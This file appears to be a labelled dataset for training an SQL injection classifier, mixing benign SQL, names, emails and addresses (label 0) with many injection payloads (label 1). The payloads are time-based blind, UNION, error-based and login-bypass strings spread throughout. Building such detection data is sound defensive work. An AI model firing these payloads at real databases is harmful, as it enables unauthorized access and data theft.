Query,Label
SELECT * FROM operation WHERE greatest = 'strip' LIMIT 3,0
SELECT * FROM sum WHERE    NOT especially = 'opportunity',0
robledollano,0
bauer,0
 )   or pg_sleep  (  __TIME__  )  --,1
"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1
32027973j,0
onofre,0
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",1
SELECT TOP 50 PERCENT * FROM wear SELECT * FROM parent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM difficult,0
select pg_sleep  (  5  )   and '%'  =  ',1
-5769  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
57879425v,0
SELECT * FROM  ( SELECT start FROM production ) ,0
SELECT * FROM  ( SELECT tape FROM practice ) ,0
"-3349' or elt  (  6610  =  4379,4379  )   and 'poqm' like 'poqm",1
SELECT * FROM science WHERE heading = 'diameter' FETCH FIRST 3 ROWS ONLY,0
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1
-5970' where 2769  =  2769 union all select 2769--,1
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
SELECT wait FROM such,0
"  SELECT DATEDIFF ( ""2017-06-25 09:34:21"", ""2017-06-15 15:25:35"" ) ;",0
SELECT * FROM harbor FETCH FIRST 50 PERCENT ROWS ONLY,0
"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",1
trevetha,0
SELECT getting,0
8.58629E+14,0
SELECT * FROM satellites WHERE studied = 'but'  OR syllable = 'film',0
8n66ies4a,0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,1
ddimo,0
"  SELECT stuck,boy FROM owner WHERE try = 'quick' UNION SELECT missing, strength FROM gather",0
"c/ pintor viver s/n, 1?b",0
SELECT * FROM taught WHERE    NOT chose = 'make',0
"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",1
SELECT * FROM Customers LIMIT 3;,0
tabakov@wdsl.ly,0
1  )   as bhdj where 4472  =  4472,1
65904927z,0
94lp90ulo,0
SELECT * FROM sudden WHERE ourselves = 'stairs' FETCH FIRST 3 ROWS ONLY,0
SELECT look ( s )  FROM service SELECT remember FROM surface,0
"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
striebeck.magnuson@alpesfranceses.com.im,0
SELECT agree FROM sink UNION SELECT brown FROM ill ORDER BY describe,0
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",1
SELECT * FROM figure WHERE properly BETWEEN '1996-07-01' AND '1996-07-31',0
select   (  case when   (  2830  =  7046  )   then 2830 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1' in boolean mode  )   or elt  (  6272  =  6272,sleep  (  5   )    )   #",1
"1  )   where 2781  =  2781 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
segura de los baos,0
SELECT eleven ( s FROM nothing RIGHT JOIN,0
5.60169E+15,0
"carlos arniches 78,",0
"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",1
gabriela1,0
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;",0
"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",1
"-3781  )   union all select 3916,3916,3916--",1
"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT TOP 3 * FROM silly WHERE supper = 'wet' SELECT * FROM bill,0
"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
62145911a,0
SELECT TOP 3 * FROM crew,0
"-6405' union all select 8235,8235,8235,8235,8235#",1
"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",1
embo4ina80,0
"  SELECT * FROM twice WHERE lost NOT IN  ( 'bit', 'typical', 'darkness' )  ",0
"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1
"calle artigako haritza, s/n 8?d",0
SELECT COUNT ( wrong ) FROM work,0
"   SELECT COUNT ( weigh ) , positive FROM stretch BY stream",0
"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",1
"1 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
19846981m,0
sidonio,0
-7901  )   order by 1--,1
" SELECT * FROM tonight ORDER BY paint ASC, mass DESC",0
FROM  ( SELECT DISTINCT instance FROM pay ) ,0
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT * FROM floating WHERE floating = 'himself' FETCH FIRST 3 ROWS ONLY,0
"-7559"" or 8792  =  6905--",1
SELECT AVG ( Price ) FROM battle,0
" SELECT column_name ( s )  FROM laid,life",0
"-9886%'   )    )     )   union all select 5191,5191,5191,5191,5191,5191,5191--",1
9637,0
SELECT COUNT ( dawnID ) FROM block,0
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,1
"-6017 union all select 8449,8449,8449--",1
SELECT * FROM expect WHERE funny = 'wind' FETCH FIRST 3 ROWS ONLY,0
"1""  )   and sleep  (  5  )  #",1
"c/ barriada nueva andalucia, 79, 5?f",0
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",1
SELECT * FROM wp_posts WHERE ID  =  28731 LIMIT 1,0
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
SELECT * FROM bread WHERE easier = 'affect'  AND City = 'foot',0
select * from users where id  =  1. or 1  =  1 -- 1,1
"  SELECT Orders.strugglerID, Employees.brief, Employees.favorite FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.leafID ORDER BY Orders.grabbedID",0
"INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",0
DELETE FROM recall WHERE lake = 'society',0
"admin"" or 1  =  1#",1
"  SELECT * FROM boy WHERE football IN  ( 'sudden', 'weak', 'process' )  ",0
SELECT AVG ( setting ) FROM than,0
"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",1
desolladamen-te,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
8.85119E+15,0
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',1
SELECT * FROM though WHERE camera NOT LIKE '[spirit]%',0
SELECT AVG ( nails ) FROM principal SELECT SUM ( lungs ) ,0
"1'   )    )    as popm where 6594  =  6594 union all select null,null#",1
"INSERT INTO list  ( aid, pot, interior )  VALUES  ( 'blood', 'surface', 'surrounded' )  ",0
"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
21302211w,0
SELECT * FROM riding WHERE nuts BETWEEN '1996-07-01' AND '1996-07-31',0
1   )    )    as hxzh where 9284  =  9284,1
SELECT Count ( * )  AS dried,0
"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",1
SELECT * FROM promised WHERE shout BETWEEN black09/01/1996nearly AND jungle15/31/1996move,0
"   SELECT warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly AS ago  FROM attack",0
02879028a,0
"-5863"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""gkvy""  =  ""gkvy",1
1'   )    )     )   and 5615  =  5458--,1
vila kusanovic,0
" SELECT * FROM cheese ORDER BY tone, personal",0
SELECT * FROM direction WHERE careful NOT BETWEEN 'somebody' AND 'definition',0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
"  SELECT Orders.distancerID, Employees.said, Employees.sleep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.memoryID ORDER BY Orders.rememberID",0
" select * from users where id  =  1 or ""{%"" or 1  =  1 -- 1",1
1 where 1519  =  1519,1
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",1
" SELECT * FROM root ORDER BY electric ASC, remarkable DESC",0
"1'  )   as yjdg where 5262  =  5262 union all select null,null,null#",1
SELECT MIN ( symbol )  AS while FROM hurried,0
SELECT COUNT ( pony )  FROM easier,0
-3083  )   or 5221  =  7829,1
"1""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"SELECT CHARACTER_LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0
"-9352""   )    )     )   or 3038  =  3038",1
8.65216E+15,0
SELECT * FROM thus,0
SELECT * FROM rocky 3 SELECT * FROM handle,0
18684547z,0
1'||  (  select 'jjpy' from dual where 6295  =  6295,1
"-5211""   )    )    as bkvr where 4082  =  4082 or 2323  =  8052",1
inocencio,0
wong@hiperespaa.ly,0
kangning,0
1'||  (  select 'avxz' from dual where 7815  =  7815,1
SELECT * FROM he WHERE jungle BETWEEN 'cup' AND 'could',0
"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",1
protectorio,0
26329,0
"-2168""   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  8126  =  8126",1
"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM keep 3,0
1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
DELETE FROM yes WHERE sheep = 'porch',0
4.79E+15,0
"1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM split WHERE letter = 'fur'  OR applied = 'most',0
"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'tfnb'  =  'tfnb",1
-1711  )   where 9098  =  9098 order by 1#,1
"   SELECT value,section,touch,aware,air     (  (  wise JOIN fully ON box.exchange =  careful.respect )   INNER JOIN noneON Orders.brick =  paper.richID ) ",0
"-9265""  )   or 7834  =  1685",1
"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
"1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM almost WHERE substance = 'garage' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM lying WHERE tomorrow  BETWEEN 10 AND 20,0
"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
69441548v,0
SELECT COUNT ( DISTINCT cost )  FROM underline,0
DELETE FROM dust,0
bilal,0
SELECT AVG ( east )  FROM smell  SELECT SUM ( string ) ,0
" SELECT column_name ( s )  FROM herd,scientist",0
1%' and 7533  =  7533 and '%'  =  ',1
50344,0
45571518p,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT pass FROM rise,0
SELECT * FROM pay WHERE powder = 'manner'  OR pilot = 'saddle',0
"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",1
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",1
"INSERT INTO driven ( your, country, welcome, popular, salt, wherever )  VALUES  ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )  ",0
-9739' or 8571  =  8571--,1
birney-warbeck@lamejorplaya.gl,0
-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",1
bota,0
"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   as xsgx where 5239  =  5239 union all select null,null--",1
48128,0
"-1949  )   as smyn where 4066  =  4066 union all select 4066,4066--",1
SELECT Count ( * )  AS toward,0
SELECT TOP 50 PERCENT * FROM our,0
"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1
-6433%'   )    )    or 9323  =  9323#,1
1'+  (  select 'qbdh' where 4006  =  4006 and 7533  =  7533  )  +',1
"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",1
pittner,0
SELECT * FROM  ( SELECT shaking FROM forth ) ,0
"logroo, 98, 5-d",0
"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
17240,0
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT TOP 50 PERCENT * FROM am,0
SELECT * FROM cave WHERE card BETWEEN '1996-07-01' AND '1996-07-31',0
0a0t4d2r,0
SELECT * FROM end WHERE foot NOT LIKE 'zipper%',0
4.46658E+15,0
SELECT MIN ( occasionally )  AS courage FROM current,0
dukes,0
end and    (    (   'pfrt'  =  'pfrt,1
10263,0
fililberto,0
"1%""   )    )    and 7533  =  7533 and    (    (   ""%""  =  """,1
"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT usually,0
"-9566%""  )   union all select 7973,7973,7973,7973--",1
"   SELECT weak, bound+ ', ' + vessels+ ' ' + cage+ ', ' + pole AS union  FROM highway",0
14100,0
"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646--",1
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,1
"  SELECT examine,coffee FROM short WHERE aside = 'notice' UNION SELECT triangle, nor FROM sets",0
"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc",1
SELECT member ( s )  FROM mood SELECT clothing ( s ) ,0
SELECT * FROM breathing WHERE dropped NOT LIKE 'bottom%',0
SELECT Count ( * )  AS again,0
"pasaje santo angel, 190,",0
"  UPDATE making SET had =  'know', City =  'means' WHERE mind =  object",0
balcells parets,0
"1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",1
1' in boolean mode  )   union all select null#,1
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'qdij'  =  'qdij",1
"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'  )   where 2802  =  2802 union all select null,null,null#",1
calle de joan miro s/n,0
SELECT column_name FROM table_name WHERE column_name BETWEEN value1 AND value2;,0
"1%'   )    )    union all select null,null,null#",1
spradlin@pcvirus.dz,0
"-7313""  )   where 3606  =  3606 union all select 3606#",1
1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT RADIANS ( 180 ) ;,0
"   SELECT Employees.vowel, COUNT ( Orders.batID )  AS engineFROM    ( OrdersINNER JOIN beauty ON Orders.tillID  =  Employees.pitchID ) ",0
SELECT * FROM thy,0
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1
DELETE FROM explain WHERE development = 'is',0
zlotnick,0
"   SELECT region, difference+ ', ' + mighty+ ' ' + ago+ ', ' + brain AS angle  FROM identity",0
"1'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty,0
-7971' union all select 4273#,1
1s,1
SELECT TOP 3 * FROM round SELECT * FROM pig 3SELECT * FROM pan,0
SELECT * FROM team WHERE corn = 'lose' LIMIT 3,0
"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",1
"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1.4996E+15,0
ren,0
9.84215E+15,0
SELECT Count ( * )  AS eaten,0
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'qyyg'  =  'qyyg",1
soldani-godet@informex.ru,0
1%' waitfor delay '0:0:5' and '%'  =  ',1
SELECT TOP 50 PERCENT * FROM remember,0
"calle de piquer, 8,",0
alg59za,0
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
magdalen1,0
admin' or '1'  =  '1'/*,1
DELETE FROM examine,0
SELECT * FROM suit  WHERE brush = travel,0
SELECT * FROM studied WHERE discuss = 'free' FETCH FIRST 3 ROWS ONLY,0
entrala,0
"  SELECT tableID AS ID, upper AS yesterday FROM future",0
SELECT * FROM married WHERE Price NOT BETWEEN 10 AND 20,0
7.41E+15,0
"poblado de regulares 180, 1d",0
"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",1
zaleska_legon@zampy.so,0
linas,0
quicena,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  +'",1
guadiana 149 6f,0
SELECT COUNT ( DISTINCT serve )  FROM completely,0
SELECT Count ( * )  AS growth,0
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  -- ofqd",1
"  SELECT pleaseID AS ID, wherever AS uncle FROM boat",0
SELECT TOP 3 * FROM ask WHERE body = 'clearly' SELECT * FROM donkey,0
"1""  )   or sleep  (  5  )  #",1
SELECT TOP 3 * FROM sold WHERE coast = 'must',0
SELECT COUNT ( needle )  FROM difficulty,0
-8080'   )    )    order by 1#,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",1
legarreta sant,0
ive,0
SELECT * FROM fireplace WHERE brick IN  ( SELECT green FROM type ) ,0
